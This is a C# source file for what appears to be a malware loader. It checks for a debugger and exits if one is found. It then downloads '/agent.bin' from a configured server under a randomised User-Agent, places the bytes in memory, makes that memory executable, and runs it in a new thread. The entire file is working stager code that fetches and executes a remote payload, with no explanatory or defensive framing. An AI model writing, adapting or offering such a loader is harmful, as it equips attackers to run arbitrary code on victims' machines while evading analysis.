using System.Runtime.InteropServices;


namespace Loader
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint INFINITE = 0xFFFFFFFF;

        private static void Main()
        {
            if (IsDebuggerPresent())
                return;

            byte[] shellcode = Download().GetAwaiter().GetResult();
            if (shellcode == null || shellcode.Length == 0)
                return;

            Execute(shellcode);
        }

        private static async Task<byte[]> Download()
        {
            try
            {
                string userAgent = Config.UserAgents[new Random().Next(Config.UserAgents.Length)];
                using var client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", userAgent);
                return await client.GetByteArrayAsync(Config.ServerUrl + "/agent.bin");
            }
            catch
            {
                return null;
            }
        }

        private static void Execute(byte[] shellcode)
        {
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (mem == IntPtr.Zero)
                return;

            Marshal.Copy(shellcode, 0, mem, shellcode.Length);
            VirtualProtect(mem, (uint)shellcode.Length, PAGE_EXECUTE_READ, out _);

            IntPtr thread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
            if (thread == IntPtr.Zero)
                return;

            WaitForSingleObject(thread, INFINITE);
        }
    }
}